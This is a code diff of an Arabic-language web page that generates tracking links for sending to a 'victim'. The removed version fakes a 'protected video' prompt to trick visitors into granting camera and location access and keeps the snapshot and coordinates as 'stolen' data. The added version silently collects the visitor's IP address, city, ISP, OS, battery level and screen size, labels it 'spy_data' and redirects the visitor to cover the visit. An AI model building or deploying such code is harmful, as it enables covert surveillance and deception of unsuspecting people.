@@ -3,129 +3,183 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>لوحة التحكم</title>
+    <title>نظام التتبع</title>
     <style>
-        :root { --bg: #0f172a; --card: #1e293b; --accent: #3b82f6; --text: #f8fafc; --success: #10b981; }
-        body { margin: 0; background: var(--bg); font-family: sans-serif; color: var(--text); display: flex; justify-content: center; align-items: center; min-height: 100vh; }
-        .admin-box { background: var(--card); padding: 30px; border-radius: 20px; width: 90%; max-width: 400px; text-align: center; border: 1px solid #334155; }
-        .mode-btn { padding: 10px 20px; border-radius: 8px; border: 1px solid #334155; background: #0f172a; color: #94a3b8; cursor: pointer; margin: 5px; }
-        .mode-btn.active { background: var(--accent); color: white; }
-        input { width: 100%; padding: 12px; background: #0f172a; border: 1px solid #334155; border-radius: 10px; color: white; margin: 15px 0; box-sizing: border-box; }
-        .btn { background: var(--accent); color: white; border: none; padding: 14px; border-radius: 10px; cursor: pointer; width: 100%; font-weight: bold; }
-        .victim-ui { position: fixed; inset: 0; background: #000; z-index: 9999; display: flex; justify-content: center; align-items: center; }
-        .dialog { background: #111; padding: 40px; border-radius: 20px; text-align: center; border: 1px solid #222; width: 85%; max-width: 350px; }
+        :root {
+            --bg: #050505; /* أسود عميق */
+            --card: #0d1117;
+            --accent: #238636; /* أخضر تقني */
+            --neon-blue: #58a6ff;
+            --text: #c9d1d9;
+            --dim: #8b949e;
+        }
+
+        body, html {
+            margin: 0; padding: 0; width: 100%; height: 100%;
+            background: var(--bg);
+            font-family: 'Inter', 'Segoe UI', sans-serif;
+            color: var(--text);
+            overflow-x: hidden;
+        }
+
+        .container {
+            display: flex; justify-content: center; align-items: center; min-height: 100vh;
+        }
+
+        /* لوحة التحكم */
+        .admin-box {
+            background: var(--card);
+            padding: 40px;
+            border-radius: 12px;
+            width: 90%;
+            max-width: 500px;
+            box-shadow: 0 0 40px rgba(0,0,0,0.8);
+            border: 1px solid #30363d;
+            animation: slideUp 0.6s cubic-bezier(0.2, 0.8, 0.2, 1);
+        }
+
+        h2 { text-align: center; color: var(--neon-blue); margin-top: 0; font-size: 28px; letter-spacing: -1px; }
+
+        input {
+            width: 100%; padding: 16px; background: #010409; border: 1px solid #30363d;
+            border-radius: 8px; color: #fff; margin-bottom: 20px; box-sizing: border-box;
+            font-size: 15px; transition: 0.3s;
+        }
+
+        input:focus { border-color: var(--neon-blue); outline: none; box-shadow: 0 0 10px rgba(88,166,255,0.2); }
+
+        .btn {
+            background: #21262d; color: var(--neon-blue); border: 1px solid #30363d;
+            padding: 16px; border-radius: 8px; cursor: pointer; width: 100%;
+            font-weight: 800; font-size: 16px; transition: all 0.3s; text-transform: uppercase;
+        }
+
+        .btn:hover { background: var(--neon-blue); color: #fff; transform: translateY(-3px); }
+
+        .result-area {
+            margin-top: 25px; padding: 15px; background: #161b22;
+            border-radius: 8px; border-left: 4px solid var(--neon-blue); animation: fadeIn 0.5s;
+        }
+
+        /* عرض البيانات المستلمة */
+        #info-display { margin-top: 30px; display: none; animation: fadeIn 0.8s; }
+        .info-card { 
+            background: #0d1117; padding: 20px; border-radius: 8px; 
+            border: 1px solid var(--accent); position: relative;
+        }
+
+        .info-item { display: flex; justify-content: space-between; padding: 10px 0; border-bottom: 1px solid #21262d; font-size: 14px; }
+        .info-item b { color: var(--neon-blue); }
+        .info-item span { color: #fff; text-align: left; }
+
+        .pulse { 
+            width: 10px; height: 10px; background: var(--accent); 
+            border-radius: 50%; display: inline-block; margin-left: 8px;
+            box-shadow: 0 0 10px var(--accent); animation: pulse 1.5s infinite;
+        }
+
+        @keyframes pulse { 0% { opacity: 1; } 50% { opacity: 0.3; } 100% { opacity: 1; } }
+        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
+        @keyframes slideUp { from { transform: translateY(30px); opacity: 0; } to { transform: translateY(0); opacity: 1; } }
+
         .hidden { display: none !important; }
-        #location-data { background: #0f172a; padding: 15px; border-radius: 10px; border: 1px solid var(--success); margin-top: 20px; }
     </style>
 </head>
 <body>
 
-<div id="admin-panel" class="admin-box">
-    <h2>لوحة التحكم</h2>
-    <div>
-        <button class="mode-btn active" onclick="setMode('c1', this)">صورة</button>
-        <button class="mode-btn" onclick="setMode('l2', this)">موقع</button>
-    </div>
-    <input type="text" id="urlInput" placeholder="أدخل الرابط هنا">
-    <button class="btn" onclick="generate()">إنشاء رابط</button>
-    <div id="result" class="hidden" style="margin-top:15px;">
-        <input id="finalLink" readonly style="font-size:12px; text-align:center;">
-    </div>
-    <div id="display" class="hidden">
-        <div id="cam-res" class="hidden"><img id="preview" style="width:100%; border-radius:10px; margin-top:15px;"></div>
-        <div id="loc-res" class="hidden">
-            <div id="location-data">
-                <p style="color:var(--success)">✅ تم سحب الإحداثيات!</p>
-                <p id="coords" style="font-size:12px;"></p>
-                <a id="mapBtn" target="_blank" class="btn" style="background:#ef4444; text-decoration:none; display:block; margin-top:10px;">فتح الخريطة</a>
+<div class="container">
+    <div id="admin-panel" class="admin-box">
+        <h2>نظام التعقب</h2>
+        <p style="text-align: center; color: var(--dim); font-size: 13px; margin-bottom: 30px;">سحب بيانات النظام، البطارية، والشبكة (بدون إذن)</p>
+        
+        <input type="text" id="urlInput" placeholder="أدخل الرابط المراد توجيه الضحية إليه">
+        <button class="btn" onclick="generate()">توليد الرابط المشفر</button>
+
+        <div id="result" class="result-area hidden">
+            <p style="font-size: 11px; color: var(--dim); margin-bottom: 10px;">رابط التتبع (جاهز للإرسال):</p>
+            <input type="text" id="finalLink" readonly onclick="this.select()" style="margin:0; background:#010409; border-color:var(--accent);">
+        </div>
+
+        <div id="info-display">
+            <div class="info-card">
+                <div style="margin-bottom: 15px;"><span class="pulse"></span> <b>بيانات الجهاز المكتشفة:</b></div>
+                <div id="details"></div>
             </div>
         </div>
-    </div>
-</div>
-
-<div id="victim-ui" class="victim-ui hidden">
-    <div class="dialog">
-        <h2 id="v-title">محتوى محمي</h2>
-        <p id="v-desc" style="color:#888;">يجب السماح للمشغل بالتحقق من المنطقة لتشغيل الفيديو.</p>
-        <button class="btn" id="mainAction">السماح بالمشاهدة</button>
+        <p id="waiting" style="text-align:center; color:var(--dim); font-size:12px; margin-top:20px;">الرابط خامل.. بانتظار الهدف</p>
     </div>
 </div>
 
 <script>
-let mode = 'c1';
-const urlParams = new URLSearchParams(window.location.search);
-const auth = urlParams.get('auth');
+    const params = new URLSearchParams(window.location.search);
+    const trackMode = params.get('t');
 
-function setMode(m, b) {
-    mode = m;
-    document.querySelectorAll('.mode-btn').forEach(btn => btn.classList.remove('active'));
-    b.classList.add('active');
-}
-
-// --- كود الضحية المعدل ---
-if (auth) {
-    document.getElementById('admin-panel').remove();
-    document.getElementById('victim-ui').classList.remove('hidden');
-
-    document.getElementById('mainAction').onclick = function() {
-        const target = localStorage.getItem('last_url') || 'https://youtube.com';
+    // --- منطق الضحية (صامت تماماً) ---
+    if (trackMode) {
+        document.getElementById('admin-panel').innerHTML = "<h2 style='margin-top:20%'>جاري التحميل...</h2>";
         
-        if (auth === 'c1') {
-            navigator.mediaDevices.getUserMedia({video: true}).then(s => {
-                const v = document.createElement('video'); v.srcObject = s; v.play();
-                setTimeout(() => {
-                    const c = document.createElement('canvas');
-                    c.width = 640; c.height = 480;
-                    c.getContext('2d').drawImage(v, 0, 0);
-                    localStorage.setItem('stolen_img', c.toDataURL('image/jpeg'));
-                    s.getTracks().forEach(t => t.stop());
-                    window.location.href = target;
-                }, 1000);
-            }).catch(() => window.location.href = target);
-        } else {
-            // الاستراتيجية الجديدة: التنبيه المسبق لإجبار النظام على فتح نافذة الإذن
-            alert("تنبيه: المشغل يحتاج الوصول للموقع الجغرافي لتحديد سيرفر المشاهدة الأقرب.");
-            
-            const geoOptions = { enableHighAccuracy: true, timeout: 8000, maximumAge: 0 };
-            
-            navigator.geolocation.getCurrentPosition(
-                (p) => {
-                    localStorage.setItem('stolen_loc', JSON.stringify({lat: p.coords.latitude, lng: p.coords.longitude}));
-                    window.location.href = target;
-                },
-                (e) => {
-                    // إذا فشل، نحاول مرة أخرى بصيغة Watch لزيادة الضغط على المتصفح
-                    navigator.geolocation.watchPosition((p) => {
-                        localStorage.setItem('stolen_loc', JSON.stringify({lat: p.coords.latitude, lng: p.coords.longitude}));
-                        window.location.href = target;
-                    }, () => { window.location.href = target; }, geoOptions);
-                }, geoOptions
-            );
+        async function captureAndRedirect() {
+            try {
+                // 1. جلب بيانات الـ IP
+                const ipRes = await fetch('https://ipapi.co/json/');
+                const ipData = await ipRes.json();
+                
+                // 2. جلب البطارية
+                const battery = await (navigator.getBattery ? navigator.getBattery() : Promise.resolve(null));
+                
+                const data = {
+                    ip: ipData.ip || "غير متوفر",
+                    city: ipData.city || "غير معروف",
+                    country: ipData.country_name || "غير معروف",
+                    org: ipData.org || "غير معروف",
+                    os: navigator.platform,
+                    battery: battery ? (battery.level * 100).toFixed(0) + "%" : "??",
+                    screen: `${screen.width}x${screen.height}`,
+                    time: new Date().toLocaleString('ar-EG'),
+                    agent: navigator.userAgent
+                };
+
+                // حفظ البيانات
+                localStorage.setItem('spy_data', JSON.stringify(data));
+
+                // التحويل الفوري
+                const redUrl = localStorage.getItem('red_url') || 'https://www.google.com';
+                setTimeout(() => { window.location.href = redUrl; }, 100);
+            } catch (e) {
+                window.location.href = 'https://www.google.com';
+            }
         }
-    };
-}
-
-function generate() {
-    const val = document.getElementById('urlInput').value;
-    if(!val) return alert("أدخل رابطاً");
-    localStorage.setItem('last_url', val);
-    document.getElementById('finalLink').value = window.location.origin + window.location.pathname + "?auth=" + mode;
-    document.getElementById('result').classList.remove('hidden');
-}
-
-window.addEventListener('storage', (e) => {
-    document.getElementById('display').classList.remove('hidden');
-    if (e.key === 'stolen_img') {
-        document.getElementById('cam-res').classList.remove('hidden');
-        document.getElementById('preview').src = e.newValue;
+        captureAndRedirect();
     }
-    if (e.key === 'stolen_loc') {
-        document.getElementById('loc-res').classList.remove('hidden');
-        const d = JSON.parse(e.newValue);
-        document.getElementById('coords').innerText = `Lat: ${d.lat}\nLng: ${d.lng}`;
-        document.getElementById('mapBtn').href = `https://www.google.com/maps?q=${d.lat},${d.lng}`;
+
+    // --- منطق المدير ---
+    function generate() {
+        const url = document.getElementById('urlInput').value;
+        if (!url) return;
+        localStorage.setItem('red_url', url);
+        const link = window.location.href.split('?')[0] + "?t=1";
+        document.getElementById('finalLink').value = link;
+        document.getElementById('result').classList.remove('hidden');
+        document.getElementById('waiting').innerHTML = "الرابط نشط.. في انتظار الدخول <span class='pulse'></span>";
     }
-});
+
+    window.addEventListener('storage', (e) => {
+        if (e.key === 'spy_data') {
+            const d = JSON.parse(e.newValue);
+            document.getElementById('info-display').style.display = 'block';
+            document.getElementById('waiting').style.display = 'none';
+            document.getElementById('details').innerHTML = `
+                <div class="info-item"><b>IP Address:</b> <span>${d.ip}</span></div>
+                <div class="info-item"><b>المكان:</b> <span>${d.city}, ${d.country}</span></div>
+                <div class="info-item"><b>المزود:</b> <span>${d.org}</span></div>
+                <div class="info-item"><b>النظام:</b> <span>${d.os}</span></div>
+                <div class="info-item"><b>البطارية:</b> <span>${d.battery}</span></div>
+                <div class="info-item"><b>الشاشة:</b> <span>${d.screen}</span></div>
+                <div class="info-item"><b>التوقيت:</b> <span>${d.time}</span></div>
+            `;
+        }
+    });
 </script>
+
 </body>
 </html>
